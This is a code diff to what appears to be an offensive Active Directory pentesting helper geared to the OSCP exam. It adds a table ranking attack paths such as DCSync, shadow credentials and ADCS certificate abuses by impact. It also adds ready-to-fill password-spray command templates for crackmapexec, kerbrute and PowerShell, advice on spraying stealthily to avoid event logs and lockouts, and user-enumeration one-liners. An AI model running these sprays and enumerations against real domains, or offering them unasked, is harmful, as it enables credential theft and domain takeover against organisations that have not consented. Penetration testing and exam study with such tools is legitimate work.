@@ -1510,6 +1510,79 @@ ACCESS_TYPE_PHASES = {
 
 
 # =============================================================================
+# ACCESS TYPE -> PRIORITY SCORE (impact-first ordering within phases)
+# =============================================================================
+# Higher number = higher impact = shown first in output
+# Range: 0-199 where:
+#   - 100-199: Privilege Escalation (domain compromise potential)
+#   - 50-99: Lateral Movement (code execution, access)
+#   - 0-49: Quick Wins (discovery, enumeration)
+
+ACCESS_TYPE_PRIORITY: Dict[Optional[str], int] = {
+    # === PRIVILEGE ESCALATION (100-199) ===
+    # Domain-level (highest impact)
+    "DCSync": 199,                    # Full domain compromise - krbtgt hash
+    "GoldenCert": 198,                # Forge any certificate
+    "GenericAll": 195,                # Full control - depends on target
+    "WriteOwner": 190,                # Take ownership then full control
+    "WriteDacl": 185,                 # Grant self GenericAll
+    "Owns": 180,                      # Full control on object
+
+    # Account takeover
+    "ForceChangePassword": 175,       # Instant account takeover
+    "AddKeyCredentialLink": 170,      # Shadow credentials - stealthy takeover
+    "ReadGMSAPassword": 165,          # Often service account = privileged
+    "ReadLAPSPassword": 160,          # Local admin on target
+    "SyncLAPSPassword": 158,          # Domain-wide LAPS sync
+
+    # Membership modification
+    "AddMember": 155,                 # Add self to privileged group
+    "GenericWrite": 150,              # Modify attrs, add SPN for Kerberoast
+    "WriteSPN": 145,                  # Targeted Kerberoasting
+
+    # ADCS (ordered by reliability/simplicity)
+    "ADCSESC1": 140,                  # Simple, reliable
+    "ADCSESC3": 138,                  # Enrollment agent
+    "ADCSESC4": 135,                  # Template modification
+    "ADCSESC6a": 132,                 # EDITF flag abuse
+    "ADCSESC6b": 130,                 # Issuance bypass
+    "ADCSESC7": 128,                  # CA manager
+    "ADCSESC5": 125,                  # PKI object modification
+    "ADCSESC9a": 122,                 # No security extension
+    "ADCSESC9b": 120,                 # Weak cert mapping
+    "ADCSESC10a": 118,                # Weak cert binding
+    "ADCSESC10b": 115,                # Shadow creds via ADCS
+    "ADCSESC13": 112,                 # OID group link
+    "Enroll": 105,                    # Basic enrollment
+    "EnrollOnBehalfOf": 103,          # Enrollment agent basic
+    "ManageCA": 101,                  # CA management
+    "ManageCertificates": 100,        # Cert management
+
+    # === LATERAL MOVEMENT (50-99) ===
+    # Code execution (highest in lateral)
+    "AdminTo": 99,                    # SYSTEM shell + cred dump
+    "ExecuteDCOM": 90,                # Remote code execution
+    "CanPSRemote": 85,                # PowerShell remoting
+    "HasSession": 80,                 # Credential harvest opportunity
+
+    # Delegation abuse
+    "AllowedToDelegate": 75,          # Constrained delegation
+    "AllowedToAct": 73,               # RBCD
+    "AddAllowedToAct": 71,            # Configure RBCD
+    "WriteAccountRestrictions": 70,   # Modify RBCD
+
+    # Remote access (lower - no direct code exec)
+    "CanRDP": 65,                     # GUI access only
+    "CoerceToTGT": 60,                # Requires listener setup
+    "HasSIDHistory": 55,              # Inherited access
+    "TrustedBy": 50,                  # Cross-domain (complex)
+
+    # === QUICK WINS (0-49) ===
+    None: 10,                         # Default for untyped (discovery)
+}
+
+
+# =============================================================================
 # ACCESS TYPE -> REASON TEMPLATES (for command suggestion justification)
 # =============================================================================
 
@@ -1973,6 +2046,198 @@ ARG_ACQUISITION: Dict[str, Dict[str, Any]] = {
         "example": "cifs/files04.corp.com, http/web01.corp.com",
     },
 }
+
+
+# =============================================================================
+# PASSWORD SPRAY TECHNIQUE METADATA
+# =============================================================================
+
+@dataclass
+class SprayTechniqueInfo:
+    """
+    Password spray technique metadata for educational command suggestions.
+
+    Each technique provides command templates and operational context
+    for safe password spraying operations.
+    """
+    name: str
+    description: str
+    command_templates: Dict[str, str]   # template_name -> command template
+    ports: List[int]                    # Required network ports
+    requirements: List[str]             # Prerequisites
+    noise_level: str                    # Detection risk: low, medium, high
+    advantages: str                     # Why use this technique
+    disadvantages: str                  # Limitations / risks
+    oscp_relevance: str                 # OSCP exam relevance
+    best_for: List[str]                 # Ideal scenarios
+
+
+SPRAY_TECHNIQUES: Dict[str, SprayTechniqueInfo] = {
+    "smb": SprayTechniqueInfo(
+        name="SMB-Based Spray (crackmapexec/netexec)",
+        description="Spray passwords using SMB authentication - validates creds AND checks admin access",
+        command_templates={
+            "single_password": "crackmapexec smb <DC_IP> -u <USER_FILE> -p '<PASSWORD>' -d <DOMAIN> --continue-on-success",
+            "password_list": "crackmapexec smb <DC_IP> -u <USER_FILE> -p <PASSWORD_FILE> -d <DOMAIN> --continue-on-success --no-bruteforce",
+            "single_user": "crackmapexec smb <DC_IP> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN>",
+            "network_range": "crackmapexec smb <NETWORK_RANGE> -u <USER_FILE> -p '<PASSWORD>' -d <DOMAIN> --continue-on-success",
+        },
+        ports=[445],
+        requirements=["SMB port 445 open", "Network access to targets"],
+        noise_level="high",
+        advantages="Shows admin access (Pwn3d!), validates creds + checks admin in one step",
+        disadvantages="Very noisy (Event logs 4625), triggers lockouts, detected by EDR",
+        oscp_relevance="high",
+        best_for=["Identifying admin access", "Quick validation", "Wide network spray"],
+    ),
+    "kerberos": SprayTechniqueInfo(
+        name="Kerberos TGT-Based Spray (kerbrute)",
+        description="Spray passwords using Kerberos pre-authentication - stealthiest method",
+        command_templates={
+            "single_password": "kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> <USER_FILE> '<PASSWORD>'",
+            "user_enum": "kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USER_FILE>",
+            "bruteuser": "kerbrute bruteuser -d <DOMAIN> --dc <DC_IP> <PASSWORD_FILE> '<USERNAME>'",
+        },
+        ports=[88],
+        requirements=["Kerberos port 88 reachable", "Valid user list"],
+        noise_level="low",
+        advantages="Fastest, stealthiest - only 2 UDP frames per attempt, pre-auth check avoids lockouts for invalid users",
+        disadvantages="No admin check (just validates creds), requires valid userlist, Kerberos only",
+        oscp_relevance="high",
+        best_for=["Stealth operations", "Large user lists", "Initial access", "Strict lockout policies"],
+    ),
+    "ldap": SprayTechniqueInfo(
+        name="LDAP/ADSI-Based Spray (PowerShell)",
+        description="Spray passwords using LDAP bind - works on Windows without external tools",
+        command_templates={
+            "spray_ps1": "Invoke-DomainPasswordSpray -UserList users.txt -Password '<PASSWORD>' -Verbose",
+            "spray_ps1_admin": "Invoke-DomainPasswordSpray -UserList users.txt -Password '<PASSWORD>' -Admin -Verbose",
+            "manual_bind": "(New-Object DirectoryServices.DirectoryEntry('LDAP://<DC_IP>','<DOMAIN>\\<USERNAME>','<PASSWORD>')).distinguishedName",
+        },
+        ports=[389, 636],
+        requirements=["LDAP port 389/636 open", "Windows environment (PowerShell)", "Domain-joined or runas"],
+        noise_level="medium",
+        advantages="Built into Windows - no external tools needed, uses native APIs, scriptable",
+        disadvantages="Windows-only, slower than Kerberos, requires PowerShell access on target",
+        oscp_relevance="medium",
+        best_for=["Windows-only environments", "Living off the land", "When no tools can be transferred"],
+    ),
+}
+
+
+# Spray scenarios for contextual recommendations
+SPRAY_SCENARIOS: List[Dict[str, Any]] = [
+    {
+        "scenario": "Stealth required (avoid detection)",
+        "recommendation": "kerberos",
+        "reason": "Kerbrute doesn't generate Windows Event Logs for failed auth",
+    },
+    {
+        "scenario": "Need to identify admin access",
+        "recommendation": "smb",
+        "reason": "CME shows (Pwn3d!) for admin access, validates + checks in one step",
+    },
+    {
+        "scenario": "Large user list (1000+ users)",
+        "recommendation": "kerberos",
+        "reason": "Fastest option - only 2 UDP frames per attempt",
+    },
+    {
+        "scenario": "Windows-only environment (no tool transfer)",
+        "recommendation": "ldap",
+        "reason": "Uses built-in PowerShell, no binary transfer needed",
+    },
+    {
+        "scenario": "Strict lockout policy (threshold <= 3)",
+        "recommendation": "kerberos",
+        "reason": "Pre-auth check identifies invalid users without incrementing lockout counter",
+    },
+    {
+        "scenario": "Need to spray entire subnet",
+        "recommendation": "smb",
+        "reason": "CME supports CIDR ranges, shows which hosts are accessible",
+    },
+]
+
+
+# =============================================================================
+# USER ENUMERATION COMMANDS (for generating user lists)
+# =============================================================================
+
+USER_ENUM_COMMANDS: Dict[str, Dict[str, Dict[str, str]]] = {
+    "windows": {
+        "local_users": {
+            "cmd": "net user",
+            "description": "List local users on current machine",
+        },
+        "domain_users": {
+            "cmd": "net user /domain",
+            "description": "List all domain users (requires domain access)",
+        },
+        "domain_users_to_file": {
+            "cmd": "net user /domain > users.txt",
+            "description": "Export domain users to file",
+        },
+        "powershell_ad": {
+            "cmd": "Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > users.txt",
+            "description": "PowerShell AD enumeration (requires RSAT)",
+        },
+        "ldap_query": {
+            "cmd": "(New-Object DirectoryServices.DirectorySearcher('(&(objectClass=user)(objectCategory=person))')).FindAll() | ForEach-Object { $_.Properties['samaccountname'] } > users.txt",
+            "description": "LDAP query without RSAT",
+        },
+        "net_group": {
+            "cmd": "net group \"Domain Users\" /domain",
+            "description": "List Domain Users group members",
+        },
+    },
+    "linux": {
+        "kerbrute_enum": {
+            "cmd": "kerbrute userenum -d <DOMAIN> --dc <DC_IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users.txt && cut -d' ' -f8 valid_users.txt | cut -d'@' -f1 > users.txt",
+            "description": "Enumerate valid users via Kerberos pre-auth",
+        },
+        "ldapsearch": {
+            "cmd": "ldapsearch -x -H ldap://<DC_IP> -D '<DOMAIN>\\<USERNAME>' -w '<PASSWORD>' -b '<DOMAIN_DN>' '(objectClass=user)' sAMAccountName | grep sAMAccountName | cut -d' ' -f2 > users.txt",
+            "description": "LDAP enumeration with credentials",
+        },
+        "crackmapexec_users": {
+            "cmd": "crackmapexec smb <DC_IP> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --users | awk '{print $5}' | grep -v '\\[' > users.txt",
+            "description": "CME user enumeration (authenticated)",
+        },
+        "bloodhound_export": {
+            "cmd": "echo 'MATCH (u:User) RETURN u.name' | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | cut -d'@' -f1 > users.txt",
+            "description": "Export users from BloodHound Neo4j",
+        },
+        "rpcclient": {
+            "cmd": "rpcclient -U '<USERNAME>%<PASSWORD>' <DC_IP> -c 'enumdomusers' | grep -oP '\\[.*?\\]' | tr -d '[]' | cut -d' ' -f1 > users.txt",
+            "description": "RPC user enumeration",
+        },
+        "enum4linux": {
+            "cmd": "enum4linux -U <DC_IP> | grep 'user:' | cut -d':' -f2 | awk '{print $1}' > users.txt",
+            "description": "enum4linux user enumeration (unauthenticated if allowed)",
+        },
+    },
+}
+
+
+def get_spray_technique(method: str) -> Optional[SprayTechniqueInfo]:
+    """Get spray technique info by method name."""
+    return SPRAY_TECHNIQUES.get(method)
+
+
+def get_all_spray_techniques() -> Dict[str, SprayTechniqueInfo]:
+    """Get all spray techniques."""
+    return SPRAY_TECHNIQUES
+
+
+def get_spray_scenarios() -> List[Dict[str, Any]]:
+    """Get spray scenario recommendations."""
+    return SPRAY_SCENARIOS
+
+
+def get_user_enum_commands(platform: str = "linux") -> Dict[str, Dict[str, str]]:
+    """Get user enumeration commands for a platform."""
+    return USER_ENUM_COMMANDS.get(platform, {})
 
 
 def get_post_exploit_commands(privilege_level: str, category: Optional[str] = None) -> List[tuple]:
